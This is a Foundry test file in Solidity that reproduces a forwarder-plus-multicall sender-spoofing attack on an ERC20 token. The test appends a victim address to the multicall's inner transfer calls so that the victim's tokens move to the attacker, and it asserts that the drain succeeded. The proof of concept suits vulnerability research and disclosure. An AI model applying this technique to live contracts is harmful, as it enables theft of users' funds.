// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {console2, Test} from "forge-std/Test.sol";
import {ThirdWebSimpleERC20} from "../src/ThirdWebSimpleERC20.sol";
import {Forwarder} from "../src/Forwarder.sol";

contract ThirdWebSimpleERC20Test is Test{
    ThirdWebSimpleERC20 public token;
    Forwarder public forwarder;

    address nirlin = address(0x1A1da7Be44D477a887341Dc3EBC09A45798c7752);
    address cats = address(0x16);
    address trustedForwarder;
    
    // deploy the contract and mint token to nirlin and cats
    function setUp() public {
        // deploy the forwarder
        forwarder = new Forwarder();
        // set the forwarder as trusted forwarder - this is extra step, instead pass directly 
        trustedForwarder = address(forwarder);
        // pass in the address of trusted forwarder with deployment
        token = new ThirdWebSimpleERC20("ThirdWebSimpleERC20", "TWS", trustedForwarder);
        // on forwarder we set the target token address
        forwarder.setTarget(address(token));

        // mint 100 tokens to cats and nirlin
        token.mint(nirlin, 100e18);
        token.mint(cats, 100e18);
    }

    function testMaliciousTransfer() public {
        //cats and nirlin balances before
        uint256 catsBalanceBefore = token.balanceOf(cats);
        uint256 nirlinBalanceBefore = token.balanceOf(nirlin);
        //log
        console2.log("********Before Attack***********");
        console2.log("cats balance before: %s", catsBalanceBefore);
        console2.log("nirlin balance before: %s", nirlinBalanceBefore);


       // craft a payload which for transfer 
       bytes[] memory data = new bytes[](2);
       // crafting two transfer calls, where we appended the nirlin to calls, to simulate the attack and system will assume that nirlin called these functions instead of cast
        data[0] = abi.encodePacked(abi.encodeWithSignature("transfer(address,uint256)", cats, 50e18),address(nirlin));
        data[1] = abi.encodePacked(abi.encodeWithSignature("transfer(address,uint256)", cats, 50e18),address(nirlin));

        // call the forwardCall function on forwarder with the data and sender appended as cats
        // Here the original caller is cats but inner function calls in data have nirlin as caller which is not validate
        vm.startPrank(cats);
        forwarder.forwardCall(abi.encodePacked(abi.encodeWithSignature("multicall(bytes[])", data),address(cats)));
        vm.stopPrank();
        //cats and nirlin balances after
        uint256 catsBalanceAfter = token.balanceOf(cats);
        uint256 nirlinBalanceAfter = token.balanceOf(nirlin);
        
        //log
        console2.log("");
        console2.log("");

        console2.log("********After Attack***********");
        console2.log("cats balance after: %s", catsBalanceAfter);
        console2.log("nirlin balance after: %s", nirlinBalanceAfter);

        // assert that nirlin balance from the contract have been actually hacked.
        assert(catsBalanceAfter == 200e18);
        assert(nirlinBalanceAfter == 0);






    }
}

